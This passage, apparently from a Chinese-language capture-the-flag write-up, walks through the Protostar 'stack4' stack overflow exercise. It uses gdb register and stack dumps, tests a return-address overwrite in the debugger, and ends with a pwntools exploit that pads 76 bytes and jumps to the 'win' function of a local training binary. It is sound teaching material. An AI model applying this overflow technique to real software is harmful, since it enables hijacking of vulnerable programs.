+<span class="hljs-number">0xffffd030</span>:     <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x08048340</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x08048361</span>
+<span class="hljs-number">0xffffd040</span>:     <span class="hljs-number">0x08048408</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0xffffd064</span>      <span class="hljs-number">0x08048430</span></code></pre></div>
+<p>9、<code>ret：</code><strong>返回，结束函数。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 9, 0x0804841e <span class="hljs-keyword">in</span> main (argc=&lt;error reading variable: Unknown argument list address <span class="hljs-keyword">for</span> `argc<span class="hljs-string">'.&gt;, 
+    argv=&lt;error reading variable: Unknown argument list address for `argv'</span>.&gt;) at stack4/stack4.c:16
+16      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0xf7e1f9c4          -136185404
+edx            0x0                 0
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfac          0xffffcfac
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x804841e           0x804841e &lt;main+22&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+   0x8048425:   lea    esi,[esi+eiz*1+0x0]
+   0x8048429:   lea    edi,[edi+eiz*1+0x0]
+   0x8048430 &lt;__libc_csu_init&gt;: push   ebp
+   0x8048431 &lt;__libc_csu_init+1&gt;:       mov    ebp,esp
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
+0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
+0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
+0xffffcfdc:     0x00000000      0xf25e5086      0x89ae3a96      0x00000000
+0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
+0xffffcffc:     0x1d1faa00      0xf7ffda20      0xf7c23756      0xf7e1dff4
+0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
+0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
+0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
+0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
+0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
+0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
+0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
+0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
+0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
+0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a</code></pre></div>
+<p>执行完<code>ret</code>指令后，再次查看相应变化，可以见到并未执行win函数；</p>
+<div><pre class="hljs"><code>(gdb) n
+__libc_start_call_main (main=main@entry=0x8048408 &lt;main&gt;, argc=argc@entry=1, argv=argv@entry=0xffffd064)
+    at ../sysdeps/nptl/libc_start_call_main.h:74
+74      ../sysdeps/nptl/libc_start_call_main.h: No such file or directory.
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0xf7e1f9c4          -136185404
+edx            0x0                 0
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfc0          0xffffcfc0
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0xf7c237c8          0xf7c237c8 &lt;__libc_start_call_main+120&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0xf7c237c8 &lt;__libc_start_call_main+120&gt;:     sub    esp,0xc
+   0xf7c237cb &lt;__libc_start_call_main+123&gt;:     push   eax
+   0xf7c237cc &lt;__libc_start_call_main+124&gt;:     call   0xf7c3c1a0 &lt;__GI_exit&gt;
+   0xf7c237d1 &lt;__libc_start_call_main+129&gt;:     call   0xf7c84320 &lt;__GI___nptl_deallocate_tsd&gt;
+   0xf7c237d6 &lt;__libc_start_call_main+134&gt;:     mov    eax,DWORD PTR [esp]
+   0xf7c237d9 &lt;__libc_start_call_main+137&gt;:     lock sub DWORD PTR [eax+0x124],0x1
+   0xf7c237e1 &lt;__libc_start_call_main+145&gt;:     je     0xf7c237fb &lt;__libc_start_call_main+171&gt;
+   0xf7c237e3 &lt;__libc_start_call_main+147&gt;:     mov    edx,0x1
+   0xf7c237e8 &lt;__libc_start_call_main+152&gt;:     xor    ebx,ebx
+   0xf7c237ea &lt;__libc_start_call_main+154&gt;:     lea    esi,[esi+0x0]
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
+0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
+0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
+0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
+0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
+0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
+0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
+0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
+0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430
+0xffffd050:     0x08048420      0xf7fcecd0      0xffffd05c      0xf7ffda20
+0xffffd060:     0x00000001      0xffffd237      0x00000000      0xffffd251
+0xffffd070:     0xffffd260      0xffffd274      0xffffd297      0xffffd2cd
+0xffffd080:     0xffffd2ee      0xffffd2fb      0xffffd319      0xffffd335
+0xffffd090:     0xffffd351      0xffffd361      0xffffd372      0xffffd37c
+0xffffd0a0:     0xffffd389      0xffffd3a8      0xffffd44a      0xffffd468
+0xffffd0b0:     0xffffd483      0xffffd49a      0xffffd4ad      0xffffd4cb</code></pre></div>
+<hr />
+<p><strong>分析：</strong></p>
+<p>可以看到，在<code>call 0x804830c &lt;gets@plt&gt;</code>,程序需要我们的输入，于是我们输入输入了长度为64的‘a’,即‘a’*64;</p>
+<p>然后我们观察输入后的栈结构，如下图所示：</p>
+<p><img src="/_resources/369cc4d3ba294f94929d2281e8f0d7c8.png" /></p>
+<p>但是从最后的结果来看，长度为64并没有成功溢出跳转到win函数，所以我们继续往下看，寻找ret的返回地址，如下图：</p>
+<p><img src="/_resources/4409785612014b819afec5c62fb9f3e0.png" /></p>
+<p>从上图可以看到，即将执行的<code>ret</code>的存储的返回地址就是此刻位于栈顶的<code>0xf7c237c5</code></p>
+<p>那么，我们的目标就是：<strong>输入足够的长度，覆盖到</strong><code>0xf7c237c5</code><strong>为止</strong></p>
+<p><strong><img src="/_resources/9c3dc04410924bec86daab2e5f96a1ad.png" /></strong></p>
+<p><strong>从上图中可以很清晰的看到，我们还需要填充(3组)x(每组4字节)=（一共12字节）的长度，才能达到返回地址前，然后再用目标地址覆盖原来的返回地址</strong></p>
+<p><strong>我们的目标地址应当是win函数的地址，如下：win函数地址为<code>0x80483f4</code></strong></p>
+<div><pre class="hljs"><code>(gdb) <span class="hljs-built_in">print</span> win
+<span class="hljs-variable">$7</span> = {void (void)} 0x80483f4 &lt;win&gt;</code></pre></div>
+<p><strong>我们也可以在执行ret前做一下测试，用set命令直接修改<code>0xf7c237c5</code>为<code>0x80483f4</code>，过程如下：</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 9, 0x0804841e <span class="hljs-keyword">in</span> main (argc=&lt;error reading variable: Unknown argument list address <span class="hljs-keyword">for</span> `argc<span class="hljs-string">'.&gt;, 
+    argv=&lt;error reading variable: Unknown argument list address for `argv'</span>.&gt;) at stack4/stack4.c:16
+16      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0xf7e1f9c4          -136185404
+edx            0x0                 0
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfac          0xffffcfac
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x804841e           0x804841e &lt;main+22&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+   0x8048425:   lea    esi,[esi+eiz*1+0x0]
+   0x8048429:   lea    edi,[edi+eiz*1+0x0]
+   0x8048430 &lt;__libc_csu_init&gt;: push   ebp
+   0x8048431 &lt;__libc_csu_init+1&gt;:       mov    ebp,esp
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
+0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
+0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
+0xffffcfdc:     0x00000000      0x926a73bc      0xe99a19ac      0x00000000
+0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
+0xffffcffc:     0xbe8c9100      0xf7ffda20      0xf7c23756      0xf7e1dff4
+0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
+0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
+0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
+0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
+0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
+0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
+0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
+0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
+0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
+0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a
+(gdb) <span class="hljs-built_in">set</span> *0xffffcfac=0x80483f4
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcfac:     0x080483f4      0x00000001      0xffffd064      0xffffd06c
+0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
+0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
+0xffffcfdc:     0x00000000      0x926a73bc      0xe99a19ac      0x00000000
+0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
+0xffffcffc:     0xbe8c9100      0xf7ffda20      0xf7c23756      0xf7e1dff4
+0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
+0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
+0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
+0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
+0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
+0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
+0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
+0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
+0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
+0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a
+(gdb) n
+win () at stack4/stack4.c:7
+7       <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0xf7e1f9c4          -136185404
+edx            0x0                 0
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfb0          0xffffcfb0
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x80483f4           0x80483f4 &lt;win&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x80483f4 &lt;win&gt;:     push   ebp
+   0x80483f5 &lt;win+1&gt;:   mov    ebp,esp
+   0x80483f7 &lt;win+3&gt;:   sub    esp,0x18
+   0x80483fa &lt;win+6&gt;:   mov    DWORD PTR [esp],0x80484e0
+   0x8048401 &lt;win+13&gt;:  call   0x804832c &lt;puts@plt&gt;
+   0x8048406 &lt;win+18&gt;:  leave
+   0x8048407 &lt;win+19&gt;:  ret
+   0x8048408 &lt;main&gt;:    push   ebp
+   0x8048409 &lt;main+1&gt;:  mov    ebp,esp
+   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0
+(gdb) n
+win () at stack4/stack4.c:8
+8       <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) n
+code flow successfully changed
+9       <span class="hljs-keyword">in</span> stack4/stack4.c</code></pre></div>
+<p>从上述过程中，我们可以看到，在执行ret指令前，我们将位于栈顶的返回地址 <code>0xf7c237c5</code>修改为<code>0x80483f4</code>，然后成功跳转到了win函数并输出了我们的期望目标：<code>code flow successfully changed</code></p>
+<hr />
+<p><strong>Exp如下：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">"./stack4"</span>)
+
+ret_addr  = <span class="hljs-number">0x80483f4</span>
+
+payload  = <span class="hljs-string">b'a'</span>*<span class="hljs-number">76</span>
+
+payload += p32(ret_addr)
+
+sh.sendline(payload)
+
+<span class="hljs-built_in">print</span>(sh.recvline())</code></pre></div>
+<p><strong>BinGo!!!</strong></p>
+<p><img src="/_resources/9a7840d59a1e46a28068c6598a58db33.png" /></p>
+<p> </p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
